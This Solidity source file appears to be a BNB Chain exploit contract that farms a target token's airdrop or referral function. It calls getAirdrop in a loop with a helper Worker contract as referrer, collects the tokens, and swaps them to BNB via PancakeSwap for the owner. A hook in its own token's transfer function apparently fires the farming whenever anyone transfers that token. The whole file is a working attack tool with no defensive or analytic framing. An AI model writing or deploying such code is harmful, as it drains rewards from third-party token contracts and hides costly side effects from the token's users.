// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "./ERC20.sol";

interface Target {
    function getAirdrop(address _refer) external returns (bool success);
}

interface ISWAP {
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
}

contract Worker {
    address public owner = msg.sender;

    function collect(address contractAddr) public {
        IERC20(contractAddr).transfer(owner, IERC20(contractAddr).balanceOf(address(this)));
    }

    function collectEth() public {
        payable(owner).transfer(address(this).balance);
    }
}

contract H is ERC20 {
    address public constant pancakeRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address public constant wBNBAddr = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

    int public claimCount = 256;
    address public claimAddress = address(0);

    Worker public worker = new Worker();

    function replacementTransfer() public override {
        claim();
    }

    function claim() public {
        if(claimAddress != address(0)) {
            run(claimCount, claimAddress);
        }
    }

    function run(int count, address contractAddr) public {        
        Target target = Target(contractAddr);

        if(IERC20(contractAddr).balanceOf(address(worker)) == 0) {
            target.getAirdrop(address(worker));
            IERC20(contractAddr).transfer(address(worker), IERC20(contractAddr).balanceOf(address(this)));
        }

        int j = 0;
        while(j < count) {
            j++;
            target.getAirdrop(address(worker));
        }
        worker.collect(contractAddr);

        address[] memory path = new address[](2);
        path[0] = contractAddr;
        path[1] = wBNBAddr;
        uint256 balance = IERC20(contractAddr).balanceOf(address(this));
        IERC20(contractAddr).approve(pancakeRouter, balance);
        ISWAP(pancakeRouter).swapExactTokensForETH(balance, 1, path, owner, 99999999999999999);
    }


    function collect(address contractAddr) public {
        worker.collect(contractAddr);
        IERC20(contractAddr).transfer(owner, IERC20(contractAddr).balanceOf(address(this)));
    }

    function collectEth() public {
        worker.collectEth();
        payable(owner).transfer(address(this).balance);
    }

    function setOwner(address newOwner) public onlyOwner {
        owner = newOwner;
    }

    function setClaim(int count, address contractAddr) public onlyOwner {
        claimCount = count;
        claimAddress = contractAddr;
    }

    receive() external payable {}
}